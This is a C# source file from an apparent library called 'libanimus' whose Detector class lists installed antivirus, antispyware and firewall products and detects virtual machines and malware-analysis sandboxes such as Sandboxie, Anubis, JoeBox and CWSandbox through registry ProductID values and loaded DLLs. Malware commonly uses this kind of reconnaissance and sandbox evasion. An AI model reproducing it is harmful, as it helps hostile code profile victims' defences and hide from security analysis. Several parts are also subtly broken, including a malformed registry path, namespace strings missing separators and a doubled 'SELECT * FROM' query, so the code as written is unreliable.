using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using libanimus.Internal;
using Microsoft.Win32;

namespace libanimus
{
	public static class Detector
	{
		const string SECURITY_CENTER_NT5	= "rootSecurityCenter";
		const string SECURITY_CENTER_NT6	= "rootSecurityCenter2";
		const string WIN32_COMPUTER_SYSTEM	= "Win32_ComputerSystem";
		const string REG_CURRENTVERSION		= "SOFTWARE\\Microsoft Windows\\NT\\CurrentVersion";
		const string REG_UNINSTALL			= "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall";

		static VMInfo cached_vm;
		static SandboxInfo[] cached_sandboxes;

		/// <summary>
		/// Information about VM manufacturers and models.
		/// </summary>
		readonly static VMInfo[] VM_Information = {
			// Manufacturer: Microsoft Corporation
			// Model: *VIRTUAL*
			new VMInfo ("Microsoft Virtual PC", "microsoft corporation", "virtual"),
			// Manufacturer: VMWare
			// Model: *
			new VMInfo ("VMWare (unknown edition)", "vmware"),
			// Manufacturer: *
			// Model: VirtualBox
			new VMInfo ("Oracle VirtualBox", model: "virtualbox"),
		};

		/// <summary>
		/// Information about AV products.
		/// </summary>
		readonly static AVInfo[] AV_Information = {
			new AVInfo (company: "ESET", path: "ESET", generic: true),
			new AVInfo (company: "ESET", path: "ESET\\ESET NOD32 Antivirus", name: "ESET NOD32 Antivirus"),
			new AVInfo (company: "Avast Software", path: "AVAST Software", generic: true),
			new AVInfo (company: "Avast Software", path: "AVAST Software\\Avast", name: "Avast"),
			new AVInfo (company: "AVG", path: "AVG", generic: true),
			new AVInfo (company: "AVG", path: "AVG\\AVG2015\\", name: "AVG Antivirus"),
			new AVInfo (company: "Malwarebytes", path: "Malwarebytes Anti-Malware", name: "Malwarebytes Anti-Malware"),
			new AVInfo (company: "Avira", path: "Avira", generic: true),
		};

		/// <summary>
		/// Information about sandboxes.
		/// </summary>
		readonly static SandboxInfo[] Sandbox_Information = {
			new SandboxInfo ("Sandboxie", module: "SbieDll.dll"),
			new SandboxInfo ("ThreatExpert", module: "dbghelp.dll"),
			new SandboxInfo ("Anubis2", regKey: REG_CURRENTVERSION, regValue: "ProductID", regEquals: "76487-337-8429955-22614"),
			new SandboxInfo ("JoeBox", regKey: REG_CURRENTVERSION, regValue: "ProductID", regEquals: "55274-640-2673064-23950"),
			new SandboxInfo ("CWSandbox", regKey: REG_CURRENTVERSION, regValue: "ProductID", regEquals: "76487-644-3177037-23510"),
		};

		/// <summary>
		/// Lists all installed applications.
		/// </summary>
		/// <returns>All installed applications.</returns>
		public static string[] ListApplications () {
			string[] applications;
			using (var key = Registry.LocalMachine.OpenSubKey (REG_UNINSTALL)) {
				applications = key.GetSubKeyNames ()
					.Select (subkey => {
						using (var subkey_name = key.OpenSubKey (subkey))
							return subkey_name.GetValue ("DisplayName") as string;
					})
					.Where (str =>
						!string.IsNullOrEmpty (str)
						&& !string.IsNullOrWhiteSpace (str))
					.ToArray ();
			}
			return applications;
		}

		/// <summary>
		/// Lists all registered antivirus products.
		/// </summary>
		/// <returns>The antivirus products.</returns>
		public static string[] ListAntivirus () {
			var auto = ListProducts ("AntivirusProduct");
			var manual = AV_Information.Where (av => av.IsMatch ()).ToArray ();
			foreach (var company in AV_Information.Select (av => av.Company))
				manual = manual.Count (av => company == av.Company) > 1
					? manual.Where (av => !(av.Company == company && av.Generic)).ToArray ()
					: manual;
			return auto.Concat (manual
				.Select (av => av.Generic
					? string.Format ("{0} {1}", av.Company, av.Name)
					: av.Name)).ToArray ();
		}

		/// <summary>
		/// Lists all registered antispyware products.
		/// </summary>
		/// <returns>The antispyware products.</returns>
		public static string[] ListAntispyware () {
			return ListProducts ("AntispywareProduct");
		}

		/// <summary>
		/// Lists all registered firewall products.
		/// </summary>
		/// <returns>The firewall products.</returns>
		public static string[] ListFirewalls () {
			return ListProducts ("FirewallProduct");
		}

		/// <summary>
		/// Determines if this machine is running inside of a known VM.
		/// </summary>
		/// <returns><c>true</c> if running in a VM; otherwise, <c>false</c>.</returns>
		public static bool IsVM () {
			var query = QueryAll (query: WIN32_COMPUTER_SYSTEM);
			var any = query.Any (entry => VM_Information.Any (vm => vm.IsMatch (entry)));
			cached_vm = VM_Information.FirstOrDefault (vm => query.Any (vm.IsMatch));
			return any;
		}

		/// <summary>
		/// Determines if the specified application is installed.
		/// </summary>
		/// <returns><c>true</c> if the specified app is installed; otherwise, <c>false</c>.</returns>
		/// <param name="app">App.</param>
		public static bool IsInstalled (string app) {
			return ListApplications ().Any (str => str == app);
		}

		/// <summary>
		/// Gets the name of the VM.
		/// </summary>
		/// <returns>The VM name.</returns>
		public static string GetVMName () {
			if (cached_vm == null)
				IsVM ();
			return cached_vm == null ? "Unknown" : cached_vm.Name;
		}

		public static bool IsSandbox () {
			var sandboxes = Sandbox_Information.Where (sandbox => sandbox.IsMatch ());
			cached_sandboxes = sandboxes == null
				? null : sandboxes.ToArray ();
			cached_sandboxes = cached_sandboxes != null
				? cached_sandboxes.Length == 0
				? null : cached_sandboxes : cached_sandboxes;
			return cached_sandboxes != null;
		}

		public static string[] GetSandboxNames () {
			if (cached_sandboxes == null)
				IsSandbox ();
			return cached_sandboxes == null ? new [] { "Unknown" } : cached_sandboxes.Select (sandbox => sandbox.Name).ToArray ();
		}

		/// <summary>
		/// Selects all products matching the <paramref name="product"/> category.
		/// </summary>
		/// <returns>The products.</returns>
		/// <param name="product">Product.</param>
		static string[] ListProducts (string product) {
			try {
				return Environment.OSVersion.Version.Major > 5
					? ListGeneric (SECURITY_CENTER_NT6, product)
					: ListGeneric (SECURITY_CENTER_NT5, product);
			}
			catch (Exception) {
				// Add error logging here
				return new string[0];
			}
		}

		/// <summary>
		/// Selects all items matching the query.
		/// </summary>
		/// <returns>All items matching the query.</returns>
		/// <param name="entry">Entry.</param>
		/// <param name="query">Query.</param>
		static ICollection<ManagementObject> QueryAll (string entry = null, string query = null) {
			if (string.IsNullOrEmpty (query))
				return default (ICollection<ManagementObject>);
			query = string.Format ("SELECT * FROM {0}", query);
			ManagementObjectSearcher mos;
			mos = string.IsNullOrEmpty (entry)
				? new ManagementObjectSearcher (query)
				: new ManagementObjectSearcher (entry, query);
			ManagementObjectCollection objs;
			using (mos)
				objs = mos.Get ();
			return objs.GetManagementObjects ();
		}

		/// <summary>
		/// Selects all items matching the query.
		/// </summary>
		/// <returns>The display names of all items matching the query.</returns>
		/// <param name="entryPoint">Entry point.</param>
		/// <param name="queryProduct">Query product.</param>
		static string[] ListGeneric (string entryPoint, string queryProduct) {
			var query = string.Format ("SELECT * FROM {0}", queryProduct);
			var entry = string.Format ("\\root\\{0}", entryPoint);
			return QueryAll (entry, query)
				.Select (obj => obj["displayName"].ToString ())
				.ToArray ();
		}

		/// <summary>
		/// Gets the management objects.
		/// </summary>
		/// <returns>The management objects.</returns>
		/// <param name="moc">The collection of management objects.</param>
		static ICollection<ManagementObject> GetManagementObjects (this ManagementObjectCollection moc) {
			var lst = new List<ManagementObject> ();
			foreach (var obj in moc)
				lst.Add (obj as ManagementObject);
			return lst;
		}
	}
}

